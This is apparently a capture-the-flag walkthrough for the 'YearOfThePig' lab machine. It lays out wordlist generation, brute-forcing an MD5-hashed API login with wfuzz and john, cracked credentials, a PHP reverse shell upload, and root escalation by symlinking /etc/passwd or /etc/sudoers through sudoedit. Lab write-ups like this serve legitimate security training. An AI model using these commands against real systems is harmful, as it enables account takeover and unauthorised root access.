### YearOfThePig


# portscan
```
22
80
```

name: marco, taylor

```admin login hint

Remember that passwords should be a memorable word, followed by two numbers and a special character

```

# Create custom list

Create list with words "words.txt"
create list with caracteres special

>for i in {10..99};do while read line;do echo $line$i;done < words.txt;done > words_num.txt

> while read line;do while read char;do echo $line$char;done < carac; done < words_num.txt > Final_wordlist.txt


with burp capture request

{"username":"marco","password":"1a1dc91c907325c69271ddf0c944bc72"}

password md5 encoded

>python3 md5hash.py Final_wordlist.txt final_hash.txt

>wfuzz -w final_hash.txt -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.10.200.52/api/login --hw 4

> john hash --wordlist=Final_wordlist.txt --format=Raw-md5

savoia21!        (?)


## {marco:savoia21!}

#### connect SSH

> ssh marco@{ip}

##### Privilege escalation
```
-rw-------  1 www-data www-data       24576 Dec  8 07:12 admin.db

/etc/group
web-developers:x:1002:www-data,marco

Marco can add files in /var/www/html/ lets upload php_reverse_shell

gain www-data shell 

access sqlite3 admin.db - found 

select * from users;
58a2f366b1fd51e127a47da03afc9995|marco|ea22b622ba9b3c41b22785dcb40211ac
f64ccfff6f64d57b121a85f9385cf256|curtis|a80bfe309ecaafcea1ea6cb3677971f2

use john to crack hash

{curtis:Donald1983$}

sudo -l
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php


we can create file 'config.php' with marco credential (web-developer)

use ln for link /etc/passwd

>ln -s /etc/passwd /var/www/html/*/*/config.php
> sudoedit /var/www/html/*/*/config.php

kali@machine> # openssl passwd -6 -salt nothing password

> sudoedit /var/www/html/*/*/config.php
hacker:$6$nothing$creXYt9aVGarMfNqn4XmctIp9BAzDfbCj9CUFelbTb0WiugUlxgVFBmzWzqpYjdVd7duTrAf5RsQhQe1kqo4H0:0:0::root:/bin/bash

> su hacker

root@year-of-the-pig:/#

====================================================================================================
```
## Another metod priv escalation
```
> ln -s /etc/sudoers /var/www/html/*/*/config.php
>sudoedit /var/www/html/*/*/config.php

Edit user privilege

curtis ALL=(ALL) ALL

>sudo su

root@year-of-the-pig:/# 
```



====================================================================================================
#### Another metod to create list 

>cewl http://10.10.197.153/ > cewl_list

>john -w=cewl_list --rules --stdout > cwel_uplist.txt

with hint.. add rule john
:$[0-9]$[0-9]$[!@#$%?.,&]

>john -w=cwel_uplist.txt --rules --stdout > cewl_listnum.txt
